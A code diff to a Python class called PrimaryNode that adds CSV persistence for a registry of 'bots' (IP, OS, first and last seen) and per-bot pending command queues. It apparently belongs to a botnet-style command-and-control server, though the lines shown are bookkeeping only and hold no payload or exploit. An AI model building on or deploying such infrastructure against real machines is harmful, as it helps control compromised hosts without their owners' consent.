@@ -894,6 +894,92 @@ class PrimaryNode:
             }
         return snapshot
 
+    def _load_bot_registry(self) -> None:
+        if not self.bot_registry_path.is_file():
+            return
+        try:
+            with self.bot_registry_path.open("r", newline="", encoding="utf-8") as fh:
+                reader = csv.DictReader(fh)
+                loaded: Dict[str, Dict[str, object]] = {}
+                for row in reader:
+                    bot_id = row.get("bot_id") or row.get("BOT_ID")
+                    if not bot_id:
+                        continue
+                    loaded[bot_id] = {
+                        "bot_ip": row.get("bot_ip") or row.get("IP") or "",
+                        "bot_os": row.get("bot_os") or row.get("OS") or "",
+                        "first_seen": float(row.get("first_seen") or row.get("FIRST_SEEN") or time.time()),
+                        "last_seen": float(row.get("last_seen") or row.get("LAST_SEEN") or time.time()),
+                    }
+            with self._registry_lock:
+                self.registered_bots = loaded
+                for bot_id in self.registered_bots:
+                    self.pending_commands.setdefault(bot_id, [])
+        except Exception as exc:
+            print(f"[!] PrimaryNode: Failed to load bot registry: {exc}")
+
+    def _write_bot_registry_locked(self) -> None:
+        try:
+            items = list(self.registered_bots.items())
+            with self.bot_registry_path.open("w", newline="", encoding="utf-8") as fh:
+                writer = csv.writer(fh)
+                writer.writerow(["bot_id", "bot_ip", "bot_os", "first_seen", "last_seen"])
+                for bot_id, meta in items:
+                    writer.writerow([
+                        bot_id,
+                        meta.get("bot_ip", ""),
+                        meta.get("bot_os", ""),
+                        meta.get("first_seen", 0.0),
+                        meta.get("last_seen", 0.0),
+                    ])
+        except Exception as exc:
+            print(f"[!] PrimaryNode: Failed to write bot registry: {exc}")
+
+    def _write_bot_registry(self) -> None:
+        with self._registry_lock:
+            self._write_bot_registry_locked()
+
+    def _record_bot_registration(self, bot_id: str, bot_ip: str, bot_os: str) -> Dict[str, object]:
+        now = time.time()
+        with self._registry_lock:
+            meta = self.registered_bots.get(bot_id, {
+                "first_seen": now,
+                "bot_ip": bot_ip,
+                "bot_os": bot_os,
+            })
+            meta.setdefault("first_seen", now)
+            if bot_ip:
+                meta["bot_ip"] = bot_ip
+            if bot_os:
+                meta["bot_os"] = bot_os
+            meta["last_seen"] = now
+            self.registered_bots[bot_id] = meta
+            self.pending_commands.setdefault(bot_id, [])
+            self._write_bot_registry_locked()
+        print(f"[+] PrimaryNode: Registered bot {bot_id} ({bot_os} @ {bot_ip})")
+        return {
+            "status": "ok",
+            "bot_id": bot_id,
+            "first_seen": meta.get("first_seen"),
+        }
+
+    def _record_bot_ping(self, bot_id: str) -> Dict[str, object]:
+        now = time.time()
+        with self._registry_lock:
+            meta = self.registered_bots.get(bot_id)
+            if not meta:
+                meta = {
+                    "first_seen": now,
+                    "bot_ip": "",
+                    "bot_os": "",
+                }
+            meta.setdefault("first_seen", now)
+            meta["last_seen"] = now
+            self.registered_bots[bot_id] = meta
+            self.pending_commands.setdefault(bot_id, [])
+            self._write_bot_registry_locked()
+        return {"status": "ok", "bot": bot_id}
+
     def _note_bot_ping(self, bot_id: str) -> Dict[str, object]:
         meta = self.distributed_node_meta.setdefault(bot_id, {"created_at": time.time()})
         meta["last_seen"] = time.time()
